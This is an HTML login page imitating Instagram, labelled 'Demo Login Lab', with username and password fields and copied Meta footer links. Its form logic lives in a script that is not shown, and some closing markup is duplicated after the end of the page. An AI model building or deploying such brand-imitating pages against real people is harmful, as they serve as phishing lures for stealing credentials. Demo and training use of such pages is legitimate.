<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>instagram Login</title>
  <link rel="stylesheet" href="style.css">
  <script defer src="script.js"></script>
</head>
<body>
  <main class="login-wrapper">
    <section class="login-image-section" aria-hidden="true">
    </section>

    <section class="login-form-section" aria-label="Login form">
      <div class="card">
        <h1 class="logo">Log into Instagram</h1>

        <form id="loginForm" novalidate>
          <div class="message" id="loginMessage" role="status" aria-live="polite"></div>

          <div class="input-group">
            <label class="sr-only" for="username">Username</label>
            <input
              type="text"
              id="username"
              name="username"
              class="form-input"
              placeholder="Username"
              autocomplete="username"
              required
            >
          </div>

          <div class="input-group">
            <label class="sr-only" for="password">Password</label>
            <input
              type="password"
              id="password"
              name="password"
              class="form-input"
              placeholder="Password"
              autocomplete="current-password"
              required
            >
          </div>

          <button type="submit" class="btn-primary" id="submitBtn">log in</button>
        </form>
      </div>

      <p class="local-note">Log into Instagram.</p>
    </section>
  </main>
  </main>

  <footer class="site-footer">
    <nav class="footer-links" aria-label="Footer links">
      <a href="#">About</a>
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Contact</a>
    </nav>

    <p class="footer-copy">meta about blog jobs help api privacy terms locations popular instagram lite threads contact uploding & non-user meta verified English · © 2026 Demo Login Lab</p>
  </footer>

  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
    <div class="loader" aria-label="Loading"></div>
  </div>
</body>
</html> 
  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
    <div class="loader" aria-label="Loading"></div>
  </div>
</body>
</html>
